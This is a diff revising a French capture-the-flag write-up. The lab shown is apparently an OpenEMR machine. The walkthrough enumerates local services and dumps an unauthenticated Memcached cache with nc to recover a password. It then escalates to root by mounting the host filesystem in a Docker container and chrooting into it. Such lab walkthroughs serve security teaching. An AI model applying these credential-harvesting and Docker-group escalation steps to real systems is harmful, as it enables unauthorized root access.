@@ -1637,9 +1637,9 @@ Un binaire SUID s’exécute avec les privilèges de son propriétaire plutôt q
 ss -tulnp
 ```
 
-Cette commande affiche les sockets TCP et UDP en écoute ainsi que leurs adresses et leurs ports. Elle permettra notamment de repérer les services accessibles uniquement depuis la machine locale.
+Cette commande affiche les sockets TCP et UDP en écoute ainsi que leurs adresses et leurs ports. Elle permet notamment de repérer les services accessibles uniquement depuis la machine locale.
 
-Voici le résultat :
+La sortie montre plusieurs services en écoute :
 
 ```bash
 Netid  State    Recv-Q   Send-Q                           Local Address:Port                                    Peer Address:Port                               
@@ -1663,26 +1663,15 @@ Deux autres services écoutent uniquement sur l’interface locale :
 127.0.0.1:11211
 ```
 
-Le port `3306` correspond à MySQL, utilisé par OpenEMR. Le port `11211` mérite davantage d’attention, car il est généralement associé au service de cache **Memcached**.
+Le port `3306` correspond à MySQL, utilisé par OpenEMR.
 
-Comme ce service n’est accessible que depuis la machine locale, il n’apparaissait pas lors de l’énumération externe. Le shell de `ash` permet désormais de l’interroger directement.
-
-Les ports `22` et `80` correspondent aux services déjà identifiés pendant l’énumération initiale.
-
-Deux autres services écoutent uniquement sur l’interface locale :
-
-```
-127.0.0.1:3306
-127.0.0.1:11211
-```
-
-Le port `3306` correspond à MySQL, utilisé par OpenEMR. Le port `11211` mérite davantage d’attention, car il est généralement associé au service de cache **Memcached**.
+Le port `11211` mérite davantage d’attention, car il est généralement associé au service de cache **Memcached**.
 
 Comme ce service n’est accessible que depuis la machine locale, il n’apparaissait pas lors de l’énumération externe. Le shell de `ash` permet désormais de l’interroger directement.
 
 ### Identification du service Memcached
 
-Le port `11211` est généralement utilisé par **Memcached**, un service de cache en mémoire. Pour vérifier qu’il s’agit bien de ce service et connaître sa version, tu lui envoies la commande `version` :
+Pour vérifier qu’il s’agit bien de **Memcached** et connaître sa version, tu lui envoies la commande `version` :
 
 ```bash
 printf 'version\r\nquit\r\n' | nc 127.0.0.1 11211
@@ -1703,23 +1692,17 @@ Le serveur répond :
 VERSION 1.5.6 Ubuntu
 ```
 
-Cette réponse confirme qu’un service Memcached est actif localement dans la version suivante :
-
-```txt
-1.5.6 Ubuntu
-```
+Cette réponse confirme qu’un service **Memcached 1.5.6** est actif localement.
 
 Memcached est utilisé par les applications pour stocker temporairement en mémoire des informations fréquemment consultées. Les données y sont enregistrées sous la forme de couples **clé-valeur**.
 
-Par exemple, une clé nommée `user` pourrait être associée à un nom d’utilisateur, tandis qu’une clé `passwd` pourrait contenir un mot de passe.
+Par exemple, une clé peut identifier une donnée mise en cache, tandis que la valeur correspond au contenu qui lui est associé.
 
-Dans une configuration normale, ces données sont destinées à l’application elle-même. Ici, le service écoute uniquement sur l’interface locale, mais il ne demande aucune authentification. L’utilisateur `ash` peut donc interroger directement son contenu.
+Dans une configuration normale, ces données sont destinées à l’application elle-même. Ici, le service écoute uniquement sur l’interface locale et ne demande aucune authentification. Depuis le shell de `ash`, tu peux donc commencer à examiner son contenu.
 
 ### Énumération des objets stockés dans Memcached
 
-Maintenant que le service Memcached est identifié, tu peux vérifier s’il contient des objets accessibles.
-
-Tu commences par demander les statistiques liées aux éléments actuellement stockés :
+Maintenant que le service Memcached est identifié, tu peux examiner les objets qu’il contient en demandant les statistiques associées :
 
 ```bash
 printf 'stats items\r\nquit\r\n' | nc 127.0.0.1 11211
@@ -1727,7 +1710,7 @@ printf 'stats items\r\nquit\r\n' | nc 127.0.0.1 11211
 
 La sortie contient notamment :
 
-```
+```bash
 STAT items:1:number 5
 STAT items:1:number_hot 0
 STAT items:1:number_warm 0
@@ -1760,7 +1743,7 @@ END
 
 La ligne la plus importante est :
 
-```
+```bash
 STAT items:1:number 5
 ```
 
@@ -1768,17 +1751,17 @@ Elle indique que le slab `1` contient actuellement cinq objets.
 
 Un **slab** est une zone utilisée par Memcached pour regrouper en mémoire les objets de taille similaire. L’identifiant `1` désigne ici le slab dans lequel les cinq objets ont été stockés.
 
-Tu peux maintenant demander à Memcached d’afficher les clés présentes dans ce slab :
+Tu peux maintenant demander à Memcached d’afficher les clés présentes dans le slab `1` :
 
-```
+```bash
 printf 'stats cachedump 1 100\r\nquit\r\n' | nc 127.0.0.1 11211
 ```
 
-Le premier argument, `1`, correspond à l’identifiant du slab. Le second, `100`, indique le nombre maximal d’objets à afficher.
+Le premier argument, `1`, désigne le slab à examiner. Le second, `100`, fixe le nombre maximal d’objets à retourner.
 
 La commande retourne :
 
-```
+```bash
 ITEM link [21 b; 0 s]
 ITEM user [5 b; 0 s]
 ITEM passwd [9 b; 0 s]
@@ -1797,7 +1780,7 @@ file
 account
 ```
 
-Les clés `user`, `passwd` et `account` paraissent particulièrement intéressantes. Tu peux maintenant récupérer la valeur associée à chacune d’elles.
+Tu peux maintenant récupérer la valeur associée à chacune d’elles afin de déterminer quelles informations elles contiennent.
 
 ### Récupération des valeurs stockées dans Memcached
 
@@ -1839,13 +1822,7 @@ afhj556uo
 END
 ```
 
-Chaque réponse commence par une ligne de la forme :
-
-```
-VALUE <clé> <flags> <taille>
-```
-
-Elle indique le nom de la clé demandée, les éventuels flags associés et la taille de la valeur en octets. La ligne suivante contient la valeur elle-même, puis `END` marque la fin de la réponse.
+Chaque réponse indique la clé demandée, la taille de la valeur, puis affiche son contenu avant le marqueur `END`.
 
 Parmi les données récupérées, les clés `user` et `passwd` fournissent un nouveau couple d’identifiants :
 
@@ -1853,11 +1830,11 @@ Parmi les données récupérées, les clés `user` et `passwd` fournissent un no
 luffy:0n3_p1ec3
 ```
 
-Comme `luffy` a déjà été identifié comme un utilisateur local dans `/home`, tu peux maintenant tester ces identifiants avec `su`.
+Comme `luffy` a déjà été identifié comme un utilisateur local dans `/home`, tu peux tester ce mot de passe en ouvrant une session sous son compte avec `su`.
 
 ### Passage de `ash` à `luffy`
 
-Tu testes les identifiants récupérés dans Memcached en changeant d’utilisateur :
+Tu ouvres une session sous le compte `luffy` :
 
 ```bash
 su - luffy
@@ -1887,19 +1864,19 @@ La sortie montre notamment que `luffy` appartient au groupe :
 uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
 ```
 
-Cette appartenance mérite une attention particulière. Un membre du groupe `docker` peut généralement communiquer avec le démon Docker et créer des conteneurs. Comme ce démon fonctionne avec les privilèges de `root`, cet accès peut souvent être détourné pour agir directement sur le système hôte.
+Cette appartenance mérite une attention particulière. Sur une installation Docker classique, l’accès au groupe `docker` permet de communiquer avec le démon Docker, qui fonctionne généralement avec les privilèges de `root`. Un tel accès peut donc permettre une élévation de privilèges.
 
-Tu vas donc vérifier si `luffy` peut réellement utiliser Docker.
+Tu vas maintenant vérifier si `luffy` peut effectivement utiliser Docker et si cette configuration est exploitable.
 
 ### Vérification de l’accès au démon Docker
 
-Tu commences par vérifier si `luffy` peut communiquer avec Docker :
+Tu testes d’abord l’accès de `luffy` au démon Docker :
 
 ```bash
 docker ps
 ```
 
-La commande ne retourne aucun conteneur en cours d’exécution, mais elle ne produit pas non plus d’erreur de permission. Cela confirme que `luffy` peut accéder au démon Docker.
+La commande ne retourne aucun conteneur en cours d’exécution et ne produit aucune erreur de permission. L’accès à Docker est donc confirmé.
 
 Tu vérifies ensuite les images disponibles localement :
 
@@ -1920,7 +1897,7 @@ L’objectif consiste maintenant à monter la racine du système hôte dans ce c
 
 ### Montage du système de fichiers hôte dans un conteneur
 
-Comme `luffy` peut utiliser Docker et que l’image `ubuntu:latest` est disponible localement, tu peux créer un conteneur en montant la racine du système hôte dans son arborescence :
+Tu peux maintenant créer un conteneur en montant la racine du système hôte dans son arborescence :
 
 ```bash
 docker run --rm -it \
@@ -1965,11 +1942,9 @@ indique l’image utilisée pour créer le conteneur ;
 chroot /mnt/host /bin/bash
 ```
 
-utilise le système de fichiers monté sous `/mnt/host` comme nouvelle racine et y lance `/bin/bash`.
+utilise `/mnt/host` comme nouvelle racine du système de fichiers et lance `/bin/bash` dans cette arborescence, qui correspond ici à celle de la machine hôte.
 
-Le démon Docker s’exécute avec les privilèges de `root`. Le conteneur peut donc monter la racine complète de la machine hôte, puis `chroot` permet d’exécuter un shell directement dans cette arborescence.
-
-Tu obtiens ainsi un shell disposant des privilèges de `root` sur le système hôte.
+La commande réussit à monter la racine complète de la machine hôte dans le conteneur. `chroot` permet ensuite d’utiliser cette arborescence comme nouvelle racine et d’y lancer un shell avec les privilèges de `root`.
 
 Tu peux le vérifier avec :
 
@@ -1987,7 +1962,7 @@ root@c28626745b44:/# cat /root/root.txt
 190cxxxxxxxxxxxxxxxxxxxxxxxxxxxx5d33
 ```
 
-La machine est maintenant entièrement compromise.
+La lecture de `root.txt` marque la fin de l’exploitation : la machine est désormais entièrement compromise.
 
 ## Conclusion
 
